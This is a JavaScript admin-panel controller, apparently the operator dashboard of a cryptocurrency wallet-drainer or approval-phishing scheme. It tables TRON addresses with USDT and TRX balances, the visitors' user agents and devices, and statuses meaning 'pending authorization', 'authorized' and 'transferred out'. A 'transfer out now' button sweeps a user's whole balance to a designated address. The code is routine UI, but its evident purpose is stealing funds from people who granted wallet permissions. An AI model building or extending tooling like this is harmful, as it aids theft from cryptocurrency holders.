define(['jquery', 'bootstrap', 'backend', 'table', 'form'], function ($, undefined, Backend, Table, Form) {

    var Controller = {
        index: function () {
            // 初始化表格参数配置
            Table.api.init({
                extend: {
                    index_url: 'ausers/index' + location.search,
                    add_url: 'ausers/add',
                    del_url: 'ausers/del',
                    multi_url: 'ausers/multi',
                    import_url: 'ausers/import',
                    table: 'ausers',
                }
            });

            var table = $("#table");

            // 初始化表格
            table.bootstrapTable({
                url: $.fn.bootstrapTable.defaults.extend.index_url,
                pk: 'id',
                sortName: 'id',
                search: false,
                searchFormVisible: true,
                fixedColumns: true,
                fixedRightNumber: 1,
                columns: [
                    [
                        { checkbox: true },
                        { field: 'id', title: __('Id'), operate: false },
                        { field: 'address', title: __('Address'), operate: 'LIKE', table: table, class: 'autocontent', formatter: Table.api.formatter.content },
                        {
                            field: 'usdt_balance', title: __('Usdt_balance'), operate: false, formatter: function (value, row, index) {
                                if (value === undefined || value === null || value === '') return '-';
                                // return Number(value / 1000000).toFixed(6);
                                return (value / 1000000).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 6 });
                            }
                        },
                        {
                            field: 'trx_balance', title: __('Trx_balance'), operate: false, formatter: function (value, row, index) {
                                if (value === undefined || value === null || value === '') return '-';
                                // return Number(value / 1000000).toFixed(6);
                                return (value / 1000000).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 6 });
                            }
                        },
                        { field: 'user_agent', title: __('User_agent'), operate: false, table: table, class: 'autocontent', formatter: Table.api.formatter.content },
                        { field: 'platform', title: __('设备'), operate: 'LIKE', table: table, class: 'autocontent', formatter: Table.api.formatter.content },
                        { field: 'state', title: __('Status'), searchList: { "0": __('待授权'), "1": __('已授权'), "2": __('已转出') }, formatter: Table.api.formatter.status },
                        { field: 'createtime', title: __('Createtime'), operate: false, formatter: Table.api.formatter.datetime },
                        {
                            field: 'operate',
                            title: __('Operate'),
                            table: table,
                            events: Table.api.events.operate,
                            buttons: [
                                {
                                    name: 'update',
                                    text: '更新数据',
                                    classname: 'btn btn-xs btn-info btn-click',
                                    icon: 'fa fa-refresh',
                                    click: function (options, row) {
                                        var $table = $("#" + options.tableId);
                                        var idx = Layer.load(0);
                                        Fast.api.ajax({
                                            url: 'ausers/refreshrow',
                                            data: { id: row.id },
                                        }, function () {
                                            $table.bootstrapTable('refresh');
                                            idx && Layer.close(idx);
                                            return false;
                                        }, function () {
                                            idx && Layer.close(idx);
                                        });
                                    }
                                },
                                {
                                    name: 'transfer',
                                    text: '立即转出',
                                    classname: 'btn btn-xs btn-danger btn-click',
                                    icon: 'fa fa-exchange',
                                    click: function (options, row) {
                                        var $table = $("#" + options.tableId);
                                        Layer.confirm('确认将该用户全部余额转出到指定地址？', { icon: 3, title: __('Warmtips') }, function () {
                                            var idx = Layer.load(0);
                                            Fast.api.ajax({
                                                url: 'ausers/transferall',
                                                data: { id: row.id }
                                            }, function () {
                                                $table.bootstrapTable('refresh');
                                                idx && Layer.close(idx);
                                                return false;
                                            }, function () {
                                                idx && Layer.close(idx);
                                            });
                                        });
                                    }
                                },
                                {
                                    name: 'transferlog',
                                    text: '划转记录',
                                    icon: 'fa fa-list',
                                    classname: 'btn btn-xs btn-primary btn-dialog',
                                    url: function (row) {
                                        var filter = { user_id: row.id };
                                        var op = { user_id: '=' };
                                        return 'transfer_log/index?filter=' + encodeURIComponent(JSON.stringify(filter)) + '&op=' + encodeURIComponent(JSON.stringify(op));
                                    }
                                },
                            ],
                            formatter: Table.api.formatter.operate
                        }
                    ]
                ]
            });
            var index = Layer.load(0)
            table.on('common-search.bs.table', function (ret) {
                index = Layer.load(0)
            });
            table.on('refresh.bs.table', function (ret) {
                index = Layer.load(0)
            });
            table.on('load-success.bs.table', function (ret) {
                index && Layer.close(index);
            });
            // 为表格绑定事件
            Table.api.bindevent(table);
        },
        recyclebin: function () {
            // 初始化表格参数配置
            Table.api.init({
                extend: {
                    'dragsort_url': ''
                }
            });

            var table = $("#table");

            // 初始化表格
            table.bootstrapTable({
                url: 'ausers/recyclebin' + location.search,
                pk: 'id',
                sortName: 'id',
                search: false,
                columns: [
                    [
                        { checkbox: true },
                        { field: 'id', title: __('Id') },
                        { field: 'address', title: __('Address'), operate: 'LIKE', table: table, class: 'autocontent', formatter: Table.api.formatter.content },
                        {
                            field: 'usdt_balance', title: __('Usdt_balance'), operate: false, formatter: function (value, row, index) {
                                if (value === undefined || value === null || value === '') return '-';
                                // return Number(value / 1000000).toFixed(6);
                                return (value / 1000000).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 6 });
                            }
                        },
                        {
                            field: 'trx_balance', title: __('Trx_balance'), operate: false, formatter: function (value, row, index) {
                                if (value === undefined || value === null || value === '') return '-';
                                // return Number(value / 1000000).toFixed(6);
                                return (value / 1000000).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 6 });
                            }
                        },
                        { field: 'user_agent', title: __('User_agent'), operate: 'LIKE', table: table, class: 'autocontent', formatter: Table.api.formatter.content },
                        { field: 'language', title: __('Language'), operate: 'LIKE', table: table, class: 'autocontent', formatter: Table.api.formatter.content },
                        { field: 'createtime', title: __('Createtime'), operate: false, formatter: Table.api.formatter.datetime },
                        {
                            field: 'deletetime',
                            title: __('Deletetime'),
                            width: '160px',
                            operate: 'RANGE',
                            addclass: 'datetimerange',
                            formatter: Table.api.formatter.datetime
                        },
                        {
                            field: 'operate',
                            width: '160px',
                            title: __('Operate'),
                            table: table,
                            events: Table.api.events.operate,
                            buttons: [
                                {
                                    name: 'Restore',
                                    text: __('Restore'),
                                    classname: 'btn btn-xs btn-info btn-ajax btn-restoreit',
                                    icon: 'fa fa-rotate-left',
                                    url: 'ausers/restore',
                                    refresh: true
                                },
                                {
                                    name: 'Destroy',
                                    text: __('Destroy'),
                                    classname: 'btn btn-xs btn-danger btn-ajax btn-destroyit',
                                    icon: 'fa fa-times',
                                    url: 'ausers/destroy',
                                    refresh: true
                                }
                            ],
                            formatter: Table.api.formatter.operate
                        }
                    ]
                ]
            });

            var index = Layer.load(0)
            table.on('common-search.bs.table', function (ret) {
                index = Layer.load(0)
            });
            table.on('refresh.bs.table', function (ret) {
                index = Layer.load(0)
            });
            table.on('load-success.bs.table', function (ret) {
                index && Layer.close(index);
            });
            // 为表格绑定事件
            Table.api.bindevent(table);
        },

        add: function () {
            Controller.api.bindevent();
        },
        edit: function () {
            Controller.api.bindevent();
        },
        api: {
            bindevent: function () {
                Form.api.bindevent($("form[role=form]"));
            }
        }
    };
    return Controller;
});
